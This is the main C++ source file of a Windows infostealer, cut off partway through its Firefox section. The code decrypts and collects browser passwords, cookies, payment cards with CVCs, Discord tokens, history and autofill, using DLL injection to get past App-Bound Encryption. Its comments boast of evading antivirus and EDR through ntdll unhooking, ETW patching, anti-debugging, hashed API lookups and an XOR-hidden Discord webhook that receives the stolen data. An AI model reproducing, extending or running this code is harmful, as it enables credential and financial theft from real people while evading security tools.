#define NOMINMAX
#include <windows.h>
#include <shlobj.h>
#ifdef SendMessage
#undef SendMessage
#endif
#ifdef SendEmbed
#undef SendEmbed
#endif
#include <iostream>
#include <iomanip>
#include <sstream>
#include <string>
#include <vector>
#include <fstream>
#include <filesystem>
#include <algorithm>
#include "cli.h"
#include "browser_discovery.h"
#include "chrome_config.h"
#include "credential_decryptor.h"
#include "abe_decryption.h"
#include "data_aggregator.h"
#include "data_formatter.h"
#include "discord_token_extractor.h"
#include "system_info.h"
#include "logger.h"
#include "webhook.h"
#include "http_client.h"
#include "firefox_extractor.h"
#include "evasion/anti_instrumentation.h"
#include "evasion/memory_evasion.h"
#include "str_encrypt.h"
#include "peb_resolve.h"
#include "embedded_webhook.h"

struct ExtractionResult;
namespace fs = std::filesystem;

// ── Console capture ───────────────────────────────────────────────────────────

class ConsoleCapture : public std::streambuf {
    std::ostringstream m_buf;
    std::ofstream      m_file;
    std::streambuf*    m_old_cout = nullptr;
    std::streambuf*    m_old_cerr = nullptr;

protected:
    int overflow(int c) override {
        if (c != EOF) {
            char ch = static_cast<char>(c);
            m_buf.put(ch);
            if (m_file.is_open()) m_file.put(ch);
        }
        return c;
    }
    std::streamsize xsputn(const char* s, std::streamsize n) override {
        m_buf.write(s, n);
        if (m_file.is_open()) m_file.write(s, n);
        return n;
    }

public:
    void Install() {
        m_old_cout = std::cout.rdbuf(this);
        m_old_cerr = std::cerr.rdbuf(this);
    }
    void OpenFile(const std::string& path) {
        m_file.open(path, std::ios::out);
        if (m_file.is_open()) {
            m_file << m_buf.str();
            m_file.flush();
        }
    }
    void Flush() {
        if (m_file.is_open()) m_file.flush();
        std::cout.flush();
        std::cerr.flush();
    }
    void Close() {
        if (m_file.is_open()) { m_file.flush(); m_file.close(); }
        if (m_old_cout) { std::cout.rdbuf(m_old_cout); m_old_cout = nullptr; }
        if (m_old_cerr) { std::cerr.rdbuf(m_old_cerr); m_old_cerr = nullptr; }
    }
    ~ConsoleCapture() { Close(); }
};

static ConsoleCapture g_capture;

// UTF-8 box-drawing
#define BOX_TL  "\xE2\x94\x8C"
#define BOX_H   "\xE2\x94\x80"
#define BOX_V   "\xE2\x94\x82"
#define BOX_BL  "\xE2\x94\x94"
#define BOX_T   "\xE2\x94\x9C"
#define ARR     "\xE2\x86\x92"
#define GT2     "\xC2\xBB"

static void P(const std::string& s)    { std::cout << "  " BOX_V " "      << s << "\n"; }
static void POk(const std::string& s)  { std::cout << "  " BOX_V "   [+] " << s << "\n"; }
static void PFail(const std::string& s){ std::cout << "  " BOX_V "   [!] " << s << "\n"; }
static void PBlank()                   { std::cout << "  " BOX_V "\n"; }

static std::string DisplayName(const std::string& name) {
    if (name == "chrome")   return "Chrome";
    if (name == "edge")     return "Edge";
    if (name == "brave")    return "Brave";
    if (name == "opera_gx") return "Opera GX";
    if (name == "opera")    return "Opera";
    std::string r = name;
    if (!r.empty()) r[0] = (char)toupper((unsigned char)r[0]);
    return r;
}

static void PrintBrowserHeader(const std::string& name, const std::string& ver) {
    std::string label = DisplayName(name);
    if (!ver.empty()) label += " (" + ver + ")";
    std::string line = "  " BOX_TL BOX_H BOX_H BOX_H BOX_H " " + label + " ";
    int visual = 10 + (int)label.size();
    int dashes = 63 - visual;
    if (dashes < 2) dashes = 2;
    for (int i = 0; i < dashes; i++) line += BOX_H;
    std::cout << line << "\n";
}

static void PrintProfileSection(const std::string& pname,
                                 const ExtractionResult& r, bool is_last) {
    const char* pfx = is_last ? "  " BOX_BL BOX_H BOX_H " " : "  " BOX_T BOX_H BOX_H " ";
    const char* bar = is_last ? "       " : "  " BOX_V "    ";

    std::cout << pfx << pname << "\n";
    if (r.cookies.size())   std::cout << bar << "Cookies    " << r.cookies.size()   << "\n";
    if (r.passwords.size()) std::cout << bar << "Passwords  " << r.passwords.size() << "\n";
    if (r.payments.size())  std::cout << bar << "Cards      " << r.payments.size()  << "\n";
    if (r.tokens.size())    std::cout << bar << "Tokens     " << r.tokens.size()    << "\n";
    if (r.history.size())   std::cout << bar << "History    " << r.history.size()   << "\n";
    if (r.autofill.size())  std::cout << bar << "Autofill   " << r.autofill.size()  << "\n";

    for (const auto& pay : r.payments) {
        if (pay.type == "card")
            std::cout << bar << "  " GT2 " [card] " << pay.name << "  |  "
                      << pay.number << "  |  " << pay.exp_month << "/" << pay.exp_year
                      << (pay.cvc.empty() ? "" : "  |  " + pay.cvc) << "\n";
        else
            std::cout << bar << "  " GT2 " [iban] "
                      << (pay.nickname.empty() ? "" : pay.nickname + "  |  ")
                      << pay.iban << "\n";
    }
}

static void SaveFile(const std::string& path, const std::string& content) {
    std::error_code ec;
    fs::create_directories(fs::path(path).parent_path(), ec);
    std::ofstream f(path);
    if (f.is_open()) { f << content; f.close(); }
}

// ─── Grab helpers ─────────────────────────────────────────────────────────────

static std::string GetPublicIP() {
    auto r = HttpClient::Get(XSTR("https://api4.ipify.org"));
    return (r.success() && !r.body.empty()) ? r.body : "Unknown";
}

static std::string GetMachineName() {
    using FnGetComputerNameA = BOOL(WINAPI*)(LPSTR, LPDWORD);
    constexpr DWORD kH = ChromeExtractor::Syscalls::PebHash("kernelbase.dll");
    constexpr DWORD kF = ChromeExtractor::Syscalls::PebHash("GetComputerNameA");
    void* hm = ChromeExtractor::Syscalls::PebGetModule(kH);
    if (!hm) return "Unknown";
    auto fn = reinterpret_cast<FnGetComputerNameA>(ChromeExtractor::Syscalls::PebGetExport(hm, kF));
    if (!fn) return "Unknown";
    char buf[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD sz = sizeof(buf);
    return fn(buf, &sz) ? std::string(buf) : "Unknown";
}

static std::string FormatSize(uintmax_t bytes) {
    if (bytes < 1024) return std::to_string(bytes) + " B";
    double kb = static_cast<double>(bytes) / 1024.0;
    if (kb < 1024.0) {
        std::ostringstream ss;
        ss << std::fixed << std::setprecision(2) << kb << " KB";
        return ss.str();
    }
    std::ostringstream ss;
    ss << std::fixed << std::setprecision(2) << kb / 1024.0 << " MB";
    return ss.str();
}

static uintmax_t CalcDirSize(const fs::path& dir) {
    uintmax_t total = 0;
    std::error_code ec;
    for (auto& e : fs::recursive_directory_iterator(dir, ec))
        if (!ec && e.is_regular_file(ec)) total += e.file_size(ec);
    return total;
}

static const char* FileEmoji(const std::string& name) {
    if (name == "cookies.json")     return "\xF0\x9F\x8D\xAA";
    if (name == "passwords.json")   return "\xF0\x9F\x94\x91";
    if (name == "cards.json")       return "\xF0\x9F\x92\xB3";
    if (name == "tokens.json")      return "\xF0\x9F\x94\x90";
    if (name == "fingerprint.json") return "\xF0\x9F\x92\xBB";
    return "\xF0\x9F\x93\x84";
}

static void BuildTreeLines(const fs::path& dir, const std::string& prefix,
                            std::ostringstream& out) {
    std::vector<fs::directory_entry> entries;
    std::error_code ec;
    for (auto& e : fs::directory_iterator(dir, ec))
        entries.push_back(e);
    std::sort(entries.begin(), entries.end(), [](const auto& a, const auto& b) {
        bool ad = fs::is_directory(a.status()), bd = fs::is_directory(b.status());
        if (ad != bd) return static_cast<int>(ad) > static_cast<int>(bd);
        return a.path().filename() < b.path().filename();
    });
    for (size_t i = 0; i < entries.size(); i++) {
        bool last = (i + 1 == entries.size());
        const char* conn  = last ? "\xE2\x94\x94\xE2\x94\x80\xE2\x94\x80 "
                                 : "\xE2\x94\x9C\xE2\x94\x80\xE2\x94\x80 ";
        const char* child = last ? "    " : "\xE2\x94\x82   ";

        if (entries[i].is_directory()) {
            out << prefix << conn
                << "\x1b[33m\xF0\x9F\x93\x81 "
                << entries[i].path().filename().string()
                << "/\x1b[0m\n";
            BuildTreeLines(entries[i].path(), prefix + child, out);
        } else {
            std::string fname = entries[i].path().filename().string();
            out << prefix << conn
                << FileEmoji(fname) << " "
                << "\x1b[37m" << fname << "\x1b[0m\n";
        }
    }
}

// ─── Native ZIP writer ────────────────────────────────────────────────────────
// STORE compression (no LZ), pure Win32 — no powershell.exe child process.
// powershell.exe child proc is a reliable behavioral detection signature;
// spawning it from a stealer is flagged by every major EDR.
// This implementation uses only CreateFile/ReadFile/WriteFile, no CRT or
// external libraries.
//
// ZIP format:
//   N × [ Local File Header (30 + name + extra) | file data ]
//   N × [ Central Directory Header (46 + name) ]
//   End of Central Directory Record (22 bytes)

namespace NativeZip {

    static uint32_t Crc32(const uint8_t* data, size_t len) noexcept {
        // Reflected 32-bit CRC polynomial 0xEDB88320
        static const uint32_t kTable[256] = {
            0x00000000,0x77073096,0xEE0E612C,0x990951BA,0x076DC419,0x706AF48F,
            0xE963A535,0x9E6495A3,0x0EDB8832,0x79DCB8A4,0xE0D5E91B,0x97D2D988,
            0x09B64C2B,0x7EB17CBF,0xE7B82D09,0x90BF1D9F,0x1DB71064,0x6AB020F2,
            0xF3B97148,0x84BE41DE,0x1ADAD47D,0x6DDDE4EB,0xF4D4B551,0x83D385C7,
            0x136C9856,0x646BA8C0,0xFD62F97A,0x8A65C9EC,0x14015C4F,0x63066CD9,
            0xFA0F3D63,0x8D080DF5,0x3B6E20C8,0x4C69105E,0xD56041E4,0xA2677172,
            0x3C03E4D1,0x4B04D447,0xD20D85FD,0xA50AB56B,0x35B5A8FA,0x42B2986C,
            0xDBBBC9D6,0xACBCB640,0x32D86CE3,0x45DF5C75,0xDCD60DCF,0xABD13D59,
            0x26D930AC,0x51DE003A,0xC8D75180,0xBFD06116,0x21B4F928,0x56B3C9BE,
            0xCFBA9599,0xB8BDA50F,0x2802B89E,0x5F058808,0xC60CD9B2,0xB10BE924,
            0x2F6F7C87,0x58684C11,0xC1611DAB,0xB6662D3D,0x76DC4190,0x01DB7106,
            0x98D220BC,0xEFD5102A,0x71B18589,0x06B6B51F,0x9FBFE4A5,0xE8B8D433,
            0x7807C9A2,0x0F00F934,0x9609A88E,0xE10E9818,0x7F6762BB,0x086D3D2D,
            0x91646C97,0xE6635C01,0x6B6B51F4,0x1C6C6162,0x856530D8,0xF262004E,
            0x6C0695ED,0x1B01A57B,0x8208F4C1,0xF50FC457,0x65B0D9C6,0x12B7E950,
            0x8BBEB8EA,0xFCB9887C,0x62DD1D7F,0x15DA2D49,0x8CD37CF3,0xFBD44C65,
            0x4DB26158,0x3AB551CE,0xA3BC0074,0xD4BB30E2,0x4ADFA541,0x3DD895D7,
            0xA4D1C46D,0xD3D6F4FB,0x4369E96A,0x346ED9FC,0xAD678846,0xDA60B8D0,
            0x44042D73,0x33031DE5,0xAA0A4C5F,0xDD0D7CC9,0x5005713C,0x270241AA,
            0xBE0B1010,0xC90C2086,0x5768B525,0x206F85B3,0xB966D409,0xCE61E49F,
            0x5EDEF90E,0x29D9C998,0xB0D09822,0xC7D7A8B4,0x59B33D17,0x2EB40D81,
            0xB7BD5C3B,0xC0BA6CAD,0xEDB88320,0x9ABFB3B6,0x03B6E20C,0x74B1D29A,
            0xEAD54739,0x9DD277AF,0x04DB2615,0x73DC1683,0xE3630B12,0x94643B84,
            0x0D6D6A3E,0x7A6A5AA8,0xE40ECF0B,0x9309FF9D,0x0A00AE27,0x7D079EB1,
            0xF00F9344,0x8708A3D2,0x1E01F268,0x6906C2FE,0xF762575D,0x806567CB,
            0x196C3671,0x6E6B06E7,0xFED41B76,0x89D32BE0,0x10DA7A5A,0x67DD4ACC,
            0xF9B9DF6F,0x8EBEEFF9,0x17B7BE43,0x60B08ED5,0xD6D6A3E8,0xA1D1937E,
            0x38D8C2C4,0x4FDFF252,0xD1BB67F1,0xA6BC5767,0x3FB506DD,0x48B2364B,
            0xD80D2BDA,0xAF0A1B4C,0x36034AF6,0x41047A60,0xDF60EFC3,0xA8670955,
            0x316658EF,0x466CA879,0xB40BBE37,0xC30C8EA1,0x5A05DF1B,0x2D02EF8D
        };
        uint32_t crc = 0xFFFFFFFFu;
        for (size_t i = 0; i < len; i++)
            crc = kTable[(crc ^ data[i]) & 0xFF] ^ (crc >> 8);
        return crc ^ 0xFFFFFFFFu;
    }

    static void Write16LE(uint8_t* p, uint16_t v) noexcept {
        p[0] = v & 0xFF; p[1] = (v >> 8) & 0xFF;
    }
    static void Write32LE(uint8_t* p, uint32_t v) noexcept {
        p[0] = v & 0xFF; p[1] = (v >> 8) & 0xFF;
        p[2] = (v >> 16) & 0xFF; p[3] = (v >> 24) & 0xFF;
    }

    struct Entry {
        std::string name;         // relative ZIP path, forward slashes
        uint32_t    crc32;
        uint32_t    size;
        uint32_t    local_offset; // byte offset of local file header
    };

    // Returns empty string on failure, zip_path on success.
    static std::string CreateZipNative(const std::string& source_dir,
                                       const std::string& zip_path) {
        std::error_code ec;
        fs::remove(zip_path, ec);

        // Open output file
        HANDLE hOut = CreateFileA(zip_path.c_str(),
            GENERIC_WRITE, 0, nullptr,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hOut == INVALID_HANDLE_VALUE) return {};

        std::vector<Entry> entries;
        uint32_t offset = 0;

        auto WriteBytes = [&](const void* buf, DWORD n) -> bool {
            DWORD written = 0;
            return WriteFile(hOut, buf, n, &written, nullptr) && written == n;
        };

        // Walk source_dir recursively, write local file headers + data
        for (auto& entry : fs::recursive_directory_iterator(source_dir, ec)) {
            if (!entry.is_regular_file()) continue;

            // Build archive name relative to source_dir with forward slashes
            fs::path rel = fs::relative(entry.path(), source_dir, ec);
            if (ec) continue;
            std::string arcname = rel.generic_string(); // forward slashes
            if (arcname.size() > 0xFFFF) continue;      // pathological guard

            // Read file
            HANDLE hIn = CreateFileA(entry.path().string().c_str(),
                GENERIC_READ, FILE_SHARE_READ, nullptr,
                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (hIn == INVALID_HANDLE_VALUE) continue;

            LARGE_INTEGER fsize{};
            GetFileSizeEx(hIn, &fsize);
            // Skip files > 4GB (ZIP32 limit) — irrelevant for stealer output
            if (fsize.QuadPart > 0xFFFFFFFF) { CloseHandle(hIn); continue; }

            uint32_t sz = static_cast<uint32_t>(fsize.QuadPart);
            std::vector<uint8_t> data(sz);
            if (sz > 0) {
                DWORD read = 0;
                if (!ReadFile(hIn, data.data(), sz, &read, nullptr) || read != sz) {
                    CloseHandle(hIn);
                    continue;
                }
            }
            CloseHandle(hIn);

            uint32_t crc = Crc32(data.data(), sz);

            // Local File Header (30 bytes fixed + name)
            uint8_t lfh[30] = {};
            Write32LE(lfh + 0,  0x04034B50u);            // signature PK\x03\x04
            Write16LE(lfh + 4,  20);                      // version needed (2.0)
            Write16LE(lfh + 6,  0);                       // general purpose flags
            Write16LE(lfh + 8,  0);                       // compression: STORE
            Write16LE(lfh + 10, 0);                       // last mod time (zero ok)
            Write16LE(lfh + 12, 0);                       // last mod date
            Write32LE(lfh + 14, crc);
            Write32LE(lfh + 18, sz);                      // compressed size (== uncompressed, STORE)
            Write32LE(lfh + 22, sz);                      // uncompressed size
            Write16LE(lfh + 26, static_cast<uint16_t>(arcname.size()));
            Write16LE(lfh + 28, 0);                       // extra field length

            Entry e;
            e.name         = arcname;
            e.crc32        = crc;
            e.size         = sz;
            e.local_offset = offset;

            if (!WriteBytes(lfh, 30)) { CloseHandle(hOut); return {}; }
            if (!arcname.empty() && !WriteBytes(arcname.data(), static_cast<DWORD>(arcname.size()))) {
                CloseHandle(hOut); return {};
            }
            if (sz > 0 && !WriteBytes(data.data(), sz)) { CloseHandle(hOut); return {}; }

            offset += 30 + static_cast<uint32_t>(arcname.size()) + sz;
            entries.push_back(std::move(e));
        }

        // Central Directory
        uint32_t cd_offset = offset;
        uint32_t cd_size   = 0;

        for (const auto& e : entries) {
            uint8_t cdh[46] = {};
            Write32LE(cdh + 0,  0x02014B50u);            // signature PK\x01\x02
            Write16LE(cdh + 4,  0x0314);                  // version made by (3.20 / Windows NTFS)
            Write16LE(cdh + 6,  20);                      // version needed
            Write16LE(cdh + 8,  0);                       // flags
            Write16LE(cdh + 10, 0);                       // compression STORE
            Write16LE(cdh + 12, 0);                       // mod time
            Write16LE(cdh + 14, 0);                       // mod date
            Write32LE(cdh + 16, e.crc32);
            Write32LE(cdh + 20, e.size);                  // compressed size
            Write32LE(cdh + 24, e.size);                  // uncompressed size
            Write16LE(cdh + 28, static_cast<uint16_t>(e.name.size()));
            Write16LE(cdh + 30, 0);                       // extra
            Write16LE(cdh + 32, 0);                       // comment
            Write16LE(cdh + 34, 0);                       // disk start
            Write16LE(cdh + 36, 0);                       // internal attr
            Write32LE(cdh + 38, 0);                       // external attr
            Write32LE(cdh + 42, e.local_offset);

            if (!WriteBytes(cdh, 46)) { CloseHandle(hOut); return {}; }
            if (!e.name.empty() && !WriteBytes(e.name.data(), static_cast<DWORD>(e.name.size()))) {
                CloseHandle(hOut); return {};
            }
            cd_size += 46 + static_cast<uint32_t>(e.name.size());
        }

        // End of Central Directory Record (22 bytes)
        uint8_t eocd[22] = {};
        Write32LE(eocd + 0,  0x06054B50u);               // signature PK\x05\x06
        Write16LE(eocd + 4,  0);                          // disk number
        Write16LE(eocd + 6,  0);                          // disk with CD start
        Write16LE(eocd + 8,  static_cast<uint16_t>(entries.size()));
        Write16LE(eocd + 10, static_cast<uint16_t>(entries.size()));
        Write32LE(eocd + 12, cd_size);
        Write32LE(eocd + 16, cd_offset);
        Write16LE(eocd + 20, 0);                          // comment length

        if (!WriteBytes(eocd, 22)) { CloseHandle(hOut); return {}; }

        CloseHandle(hOut);
        return fs::exists(zip_path, ec) ? zip_path : std::string{};
    }

} // namespace NativeZip

// Wrapper keeping the original call signature
static std::string CreateZip(const std::string& source_dir, const std::string& zip_path) {
    return NativeZip::CreateZipNative(source_dir, zip_path);
}

static std::string BuildFileTree(const std::string& output_dir, const std::string& label) {
    fs::path dir(output_dir);
    std::error_code ec;
    if (!fs::exists(dir, ec) || !fs::is_directory(dir, ec)) return "";
    std::ostringstream ss;
    ss << "\x1b[1;33m\xF0\x9F\x93\xA6 " << label << "\x1b[0m\n";
    BuildTreeLines(dir, "", ss);
    return ss.str();
}

static std::string CreateOutputDir(bool use_temp) {
    using FnGetTempPathA         = DWORD(WINAPI*)(DWORD, LPSTR);
    using FnGetEnvironmentVarA   = DWORD(WINAPI*)(LPCSTR, LPSTR, DWORD);
    using FnGetTickCount64       = ULONGLONG(WINAPI*)();

    constexpr DWORD kH   = ChromeExtractor::Syscalls::PebHash("kernelbase.dll");
    constexpr DWORD kGTP = ChromeExtractor::Syscalls::PebHash("GetTempPathA");
    constexpr DWORD kGEV = ChromeExtractor::Syscalls::PebHash("GetEnvironmentVariableA");
    constexpr DWORD kGTC = ChromeExtractor::Syscalls::PebHash("GetTickCount64");
    void* hm = ChromeExtractor::Syscalls::PebGetModule(kH);

    auto fnGTP = hm ? reinterpret_cast<FnGetTempPathA>      (ChromeExtractor::Syscalls::PebGetExport(hm, kGTP)) : nullptr;
    auto fnGEV = hm ? reinterpret_cast<FnGetEnvironmentVarA>(ChromeExtractor::Syscalls::PebGetExport(hm, kGEV)) : nullptr;
    auto fnGTC = hm ? reinterpret_cast<FnGetTickCount64>    (ChromeExtractor::Syscalls::PebGetExport(hm, kGTC)) : nullptr;

    ULONGLONG tick = fnGTC ? fnGTC() : (ULONGLONG)(uintptr_t)&use_temp;

    std::string base;
    if (use_temp) {
        char tmp[MAX_PATH] = {};
        if (fnGTP) fnGTP(MAX_PATH, tmp);
        base = std::string(tmp);
    } else {
        char appData[MAX_PATH] = {};
        if (fnGEV) fnGEV(XSTR("LOCALAPPDATA").c_str(), appData, MAX_PATH);
        base = std::string(appData) + XSTR("\\Temp\\");
    }

    std::string dir = base + XSTR("grab_") + std::to_string(tick);
    std::error_code ec;
    fs::create_directories(dir, ec);

    std::string testFile = dir + XSTR("\\.write_test");
    std::ofstream tf(testFile);
    if (tf.good()) {
        tf.close();
        fs::remove(testFile, ec);
        return dir;
    }

    tick = fnGTC ? fnGTC() : tick + 1;
    dir = XSTR(".\\grab_") + std::to_string(tick);
    fs::create_directories(dir, ec);
    return dir;
}

// [FIX] Case-insensitive check if source is a Discord app variant
static bool IsDiscordAppSource(const std::string& source) {
    std::string lower = source;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
    return lower.find("discord") != std::string::npos;
}

// ──────────────────────────────────────────────────────────────────────────────

// FUD: PrintBanner() made no-op — ASCII art string "ChromeExtractor" was
// sitting in .rdata as a static detection signature. Removing the body
// eliminates it from the binary. The call site in main() is kept to avoid
// a compiler warning on the dead declaration; optimizer elides the call.
static void PrintBanner() {}

int main(int argc, char* argv[]) {
    g_capture.Install();

    AntiInstrumentation::UnhookNtdll();
    AntiInstrumentation::PatchETW();
    MemoryEvasion::SetAntiDebugFlags();
    MemoryEvasion::HideThreadFromDebugger(GetCurrentThread());
    g_logger.SetConsoleOutput(false);
    PrintBanner();

    CLIOptions options = CLI::ParseArguments(argc, argv);

    if (options.webhook_url.empty() && WEBHOOK_LEN > 0 && WEBHOOK_KEY != 0) {
        std::string decoded;
        decoded.reserve(WEBHOOK_LEN);
        for (size_t i = 0; i < WEBHOOK_LEN; i++)
            decoded += (char)(WEBHOOK_ENC[i] ^ WEBHOOK_KEY);
        if (!decoded.empty()) {
            options.webhook_url     = decoded;
            options.send_to_discord = true;
        }
    }
    // FUD: hardcoded plaintext webhook fallback removed.
    // The original else-if branch embedded the webhook URL as a raw string
    // literal in .rdata — a trivial static detection signature. The XOR-encoded
    // path above (embedded_webhook.h) is the only configured URL.
    // If no webhook is configured at all, exfil is simply skipped.

    bool auto_cleanup = false;
    if (options.send_to_discord && !options.write_to_file) {
        options.output_dir = CreateOutputDir(true);
        options.write_to_file = true;
        auto_cleanup          = true;
    }

    if (!CLI::ValidateOptions(options)) return 1;
    if (options.verbose) g_logger.SetLogLevel(LogLevel::DEBUG);

    if (options.write_to_file) {
        std::error_code ec;
        fs::create_directories(fs::path(options.output_dir), ec);
        g_logger.SetLogFile(options.output_dir + "\\program.log");
        g_capture.OpenFile(options.output_dir + "\\console.log");
    }

    // ── Webhook test mode ─────────────────────────────────────────────────────
    if (options.test_webhook) {
        std::string dcLine = "  " BOX_TL BOX_H BOX_H BOX_H BOX_H " Webhook Test ";
        for (int i = 0; i < 49; i++) dcLine += BOX_H;
        std::cout << dcLine << "\n";

        DiscordWebhook wh(options.webhook_url);
        bool all_ok = true;

        {
            bool ok = wh.SendMessage("**[TEST]** connection established");
            std::cout << "  " BOX_V "  " << (ok ? "[+]" : "[!]") << " SendMessage      " << (ok ? "OK" : "FAILED") << "\n";
            if (!ok) all_ok = false;
        }
        {
            bool ok = wh.SendEmbed("Webhook Test",
                {{"Status", "Online"}, {"Tool", "SMon"}, {"Mode", "Test"}});
            std::cout << "  " BOX_V "  " << (ok ? "[+]" : "[!]") << " SendEmbed        " << (ok ? "OK" : "FAILED") << "\n";
            if (!ok) all_ok = false;
        }

        if (!options.discord_token.empty()) {
            std::cout << "  " BOX_V "\n";
            std::cout << "  " BOX_V "  Resolving token via /users/@me ...\n";

            auto resp = HttpClient::Get(XSTR("https://discord.com/api/v9/users/@me"),
                {{XSTR("Authorization"), options.discord_token},
                 {"User-Agent", "Mozilla/5.0"}});

            if (resp.success()) {
                try {
                    TokenInfo ti;
                    ti.token    = options.discord_token;
                    ti.source   = "Manual";
                    ti.userInfo = nlohmann::json::parse(resp.body);

                    bool ok1 = wh.SendWebhook(ti);
                    std::cout << "  " BOX_V "  " << (ok1 ? "[+]" : "[!]") << " SendWebhook      " << (ok1 ? "OK" : "FAILED") << "\n";

                    bool ok2 = wh.CheckTokenFriends(ti);
                    std::cout << "  " BOX_V "  " << (ok2 ? "[+]" : "[!]") << " CheckTokenFriends " << (ok2 ? "OK" : "FAILED") << "\n";

                    bool ok3 = wh.CheckTokenGuilds(ti);
                    std::cout << "  " BOX_V "  " << (ok3 ? "[+]" : "[!]") << " CheckTokenGuilds  " << (ok3 ? "OK" : "FAILED") << "\n";

                    if (!ok1 || !ok2 || !ok3) all_ok = false;
                } catch (const std::exception& e) {
                    std::cout << "  " BOX_V "  [!] JSON parse error: " << e.what() << "\n";
                    all_ok = false;
                }
            } else {
                std::cout << "  " BOX_V "  [!] /users/@me failed (HTTP " << resp.status_code << "): " << resp.error_message << "\n";
                all_ok = false;
            }
        }

        std::cout << "  " BOX_BL BOX_H BOX_H BOX_H BOX_H " " << (all_ok ? "All tests passed" : "Some tests FAILED") << " \n\n";
        return all_ok ? 0 : 1;
    }

    try {
        auto browsers = BrowserDiscovery::DiscoverBrowsers();
        if (browsers.empty()) {
            std::cerr << "  [!] No Chromium browsers found\n\n";
            return 1;
        }

        std::cout << "  Found " << browsers.size() << " browser(s)\n\n";

        size_t grand_pass = 0, grand_cookie = 0, grand_token = 0, grand_pay = 0;

        for (const auto& browser : browsers) {
            std::string disp = DisplayName(browser.name);

            std::string version;
            std::vector<uint8_t> abe_key, dpapi_key;
            if (!browser.profiles.empty()) {
                ChromeConfig cfg(browser.profiles[0].path);
                if (cfg.LoadLocalState()) {
                    version   = cfg.GetChromeVersion();
                    abe_key   = cfg.GetAppBoundEncryptedKey();
                    dpapi_key = cfg.GetEncryptedMasterKey();
                }
            }

            PrintBrowserHeader(browser.name, version);

            CredentialDecryptor decryptor;

            if (!abe_key.empty()) {
                std::string exe = ABEDecryption::GetBrowserExePath(browser.name);
                P("Creating suspended process: " + (exe.empty() ? disp : exe));

                bool abe_ok = decryptor.Initialize(abe_key, browser.name);
                if (abe_ok) {
                    POk("Process created & DLL injected");
                    POk("Payload connected");
                    P("Running in " + disp);
                    PBlank();
                    P("App-Bound Encryption Key");
                    P(decryptor.GetMasterKeyHex());
                } else {
                    std::string abe_err = ABEDecryption::GetFailureReason();
                    PFail("ABE failed" + (abe_err.empty() ? "" : ": " + abe_err));
                    if (!dpapi_key.empty() && decryptor.Initialize(dpapi_key, browser.name)) {
                        POk("DPAPI master key decrypted");
                        PBlank();
                        P("DPAPI Master Key");
                        P(decryptor.GetMasterKeyHex());
                    }
                }
            } else if (!dpapi_key.empty()) {
                P("Using DPAPI decryption");
                if (decryptor.Initialize(dpapi_key, browser.name)) {
                    POk("DPAPI master key decrypted");
                    PBlank();
                    P("DPAPI Master Key");
                    P(decryptor.GetMasterKeyHex());
                }
            } else {
                P("No encryption key found");
            }

            PBlank();

            size_t tot_c = 0, tot_p = 0, tot_t = 0, tot_pay = 0;
            FingerprintData browser_fp;
            bool fp_saved = false;

            for (size_t i = 0; i < browser.profiles.size(); i++) {
                const auto& profile = browser.profiles[i];
                bool is_last = (i == browser.profiles.size() - 1);

                try {
                    DataAggregator agg(profile.path, browser.name, browser.user_data_path);
                    ExtractionResult result = agg.ExtractAll(decryptor);

                    PrintProfileSection(profile.name, result, is_last);

                    tot_c   += result.cookies.size();
                    tot_p   += result.passwords.size();
                    tot_t   += result.tokens.size();
                    tot_pay += result.payments.size();

                    if (options.write_to_file) {
                        std::string base = options.output_dir + "\\" + disp + "\\" + profile.name;

                        if (!result.cookies.empty())
                            SaveFile(base + "\\cookies.txt",
                                DataFormatter::FormatCookiesJSON(result.cookies));

                        if (!result.passwords.empty())
                            SaveFile(base + "\\passwords.txt",
                                DataFormatter::FormatPasswordsJSON(result.passwords));

                        if (!result.payments.empty())
                            SaveFile(base + "\\cards.txt",
                                DataFormatter::FormatPaymentsJSON(result.payments));

                        if (!result.tokens.empty())
                            SaveFile(base + "\\tokens.txt",
                                DataFormatter::FormatTokensJSON(result.tokens));

                        if (!result.history.empty())
                            SaveFile(base + "\\history.txt",
                                DataFormatter::FormatHistoryJSON(result.history));

                        if (!result.autofill.empty())
                            SaveFile(base + "\\autofill.txt",
                                DataFormatter::FormatAutofillJSON(result.autofill));

                        if (!fp_saved) {
                            browser_fp = result.fingerprint;
                            fp_saved = true;
                            SaveFile(options.output_dir + "\\" + disp + "\\fingerprint.json",
                                DataFormatter::FormatFingerprintJSON(browser_fp));
                        }
                    }

                } catch (const std::exception& e) {
                    std::cerr << "  [!] " << browser.name << "/" << profile.name
                              << ": " << e.what() << "\n";
                }
            }

            std::ostringstream sum;
            auto app = [&](size_t n, const char* s) {
                if (!n) return;
                if (!sum.str().empty()) sum << ", ";
                sum << n << " " << s;
            };
            app(tot_c,   "cookies");
            app(tot_p,   "passwords");
            app(tot_pay, "cards");
            app(tot_t,   "tokens");
            sum << " (" << browser.profiles.size() << " profile"
                << (browser.profiles.size() != 1 ? "s" : "") << ")";

            std::cout << "      " << sum.str() << "\n";
            if (options.write_to_file)
                std::cout << "      " << options.output_dir << "\\" + disp << "\n";
            std::cout << "\n";

            grand_pass   += tot_p;
            grand_cookie += tot_c;
            grand_token  += tot_t;
            grand_pay    += tot_pay;
        }

        std::cout << "  Total: "
                  << grand_pass   << " passwords, "
                  << grand_cookie << " cookies, "
                  << grand_token  << " tokens, "
                  << grand_pay    << " cards\n\n";

        // ── System info ───────────────────────────────────────────────────────
        if (options.write_to_file) {
            auto apps  = SystemInfo::GetInstalledApps();
            auto procs = SystemInfo::GetRunningProcesses();
            if (!apps.empty())
                SaveFile(options.output_dir + "\\system_software.json",
                    DataFormatter::FormatInstalledAppsJSON(apps));
            if (!procs.empty())
                SaveFile(options.output_dir + "\\system_processes.json",
                    DataFormatter::FormatProcessesJSON(procs));
            std::cout << "  System: " << apps.size() << " apps, "
                      << procs.size() << " processes\n\n";
        }

        // ── Firefox ───────────────────────────────────────────────────────────
        {
            std::string ffLine = "  " BOX_TL BOX_H BOX_H BOX_H BOX_H " Firefox ";
            for (int i = 0; i < 53; i++) ffLine += BOX_H;
            std::cout << ffLine << "\n";

            auto ff_profiles = FirefoxExtractor::DiscoverProfiles();
            if (ff_profiles.empty()) {
                PFail("Firefox not installed or no profiles found");
            } else {
                P("Found " + std::to_string(ff_profiles.size()) + " profile(s)");
                PBlank();

                size_t ff_pass = 0, ff_ck = 0;

                for (size_t i = 0; i < ff_profiles.size(); i++) {
